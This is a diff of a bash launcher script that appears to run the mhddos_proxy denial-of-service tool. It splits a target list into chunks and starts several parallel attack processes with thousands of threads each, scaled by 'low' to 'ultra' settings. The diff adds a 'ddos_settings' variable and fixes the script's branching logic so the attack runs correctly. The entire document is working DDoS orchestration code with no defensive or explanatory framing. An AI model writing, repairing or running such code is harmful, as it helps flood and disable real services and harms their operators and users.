@@ -29,13 +29,12 @@ export -f typing_on_screen
     db1000n="off"
     vnstat="off"
     proxy_finder="off"
-    quality_settings="medium"
+    export threads="-t 2500"
+    export ddos_settings="medium"
 # fi
 
-#if [[ $t_set_manual != "on" ]]; then export threads="-t 2500"; fi # default threads if not passed in cmd line
-#if [[ $t_proxy_manual != "on" ]]; then export proxy_threads="2000"; fi # default proxy_threads if not passed in cmd line
-
-
+# if [[ $t_set_manual != "on" ]]; then export threads="-t 2500"; fi # default threads if not passed in cmd line
+# if [[ $t_proxy_manual != "on" ]]; then export proxy_threads="2000"; fi # default proxy_threads if not passed in cmd line
 
 ### prepare target files and show banner
 prepare_targets_and_banner () {
@@ -114,7 +113,7 @@ while [ "$1" != "" ]; do
         --medium ) export quality_settings="medium"; shift ;;
         --high ) export quality_settings="high"; shift ;;
         --ultra ) export quality_settings="ultra"; shift ;;
-        # --plite ) export lite="on"; export proxy_threads=1000; shift ;;
+#        --plite ) export lite="on"; export proxy_threads=1000; shift ;;
         -p | --proxy-threads ) export proxy_finder="on"; export proxy_threads="$2"; shift 2 ;;
         *   ) export args_to_pass+=" $1"; shift ;; #pass all unrecognized arguments to mhddos_proxy
     esac
@@ -136,17 +135,17 @@ while true; do
     if [[ $quality_settings == "low" ]]; then
         tail -n 1000 ~/multidd/targets/uniq_targets.txt > ~/multidd/targets/lite_targets.txt
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/lite_targets.txt $methods -t 2000 $args_to_pass &
-    else if [[ $quality_settings == "medium" ]]; then
+    elif [[ $quality_settings == "medium" ]]; then
         cd ~/multidd/targets/; split -n l/2 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 2 parts
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 2000 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 2000 $args_to_pass &
-    else if [[ $quality_settings == "high" ]]; then
+    elif [[ $quality_settings == "high" ]]; then
         cd ~/multidd/targets/; split -n l/4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 4 parts
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 2500 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 2500 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xac.uaripper $methods -t 2500 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods -t 2500 $args_to_pass &
-    else if [[ $quality_settings == "ultra" ]]; then
+    elif [[ $quality_settings == "ultra" ]]; then
         cd ~/multidd/targets/; split -n l/4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in 2 parts
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods -t 5000 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods -t 5000 $args_to_pass &
